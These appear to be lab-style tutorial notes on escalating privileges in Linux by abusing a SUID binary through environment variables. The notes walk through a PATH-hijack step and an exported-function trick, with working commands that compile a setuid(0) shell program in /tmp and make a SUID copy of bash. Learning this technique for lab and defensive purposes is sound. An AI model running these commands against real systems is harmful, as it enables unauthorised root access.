Environment variables are variables that are available system-wide, and are inherited by all spot child processes and shells. 

Now there are a few ways to look at environment variables. One command is env

```shell
env
```

So, the goal is to change something in these environment variables to take advantage of something else.

You know the drill... find command:

```shell
find / -type -f -perm -04000 -ls 2>/dev/null
```

For, this one, we shall use the SUID-env file

So, we can see what this file has by using the strings command:

```shell
strings <path_of_file>
```

So, at the bottom, it shows service apache2 start. It knows about service from the PATH variable. Now, what if we change where the service is being called from, basically, make a malicious service file make it execute and escalate to root.

So, we can run the following command:

```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
```

Now, compile service.c

```shell
gcc /tmp/service.c -o /tmp/service
```

Now, we have the malicious service sitting in /tmp. Now, we need to change our path.

```shell
export PATH=/tmp:$PATH
```

So, if you run the file again, you will be escalated to root as the malicious service is running first.

Lets say instead of saying service apache2 start, it gives an absolute path to service. How do we exploit this?

We can create a function: 

```shell
function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
```

Then we can export the function by:

```shell
export -f /usr/sbin/service
```

So, when you give users permissions to change environment variables and suid permissions to sudo, this can happen.